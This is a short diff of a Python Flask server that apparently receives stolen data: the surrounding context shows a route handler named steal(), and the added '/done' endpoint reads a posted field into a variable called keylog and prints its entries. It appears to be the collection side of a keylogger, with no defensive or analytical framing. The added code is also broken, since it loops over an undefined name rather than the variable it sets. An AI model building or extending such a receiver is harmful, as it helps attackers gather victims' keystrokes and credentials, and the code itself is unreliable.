@@ -161,5 +161,14 @@ def steal():
 
     return jsonify(status='ok')
 
-# if __name__ == '__main__':
-#     app.run()
+@app.route('/done', methods=['POST'])
+def done():
+
+    # get post data
+    keylog = request.form['log']
+
+    # print that post data out 
+    for entry in log:
+        print(entry) 
+
+    return jsonify(status='ok')
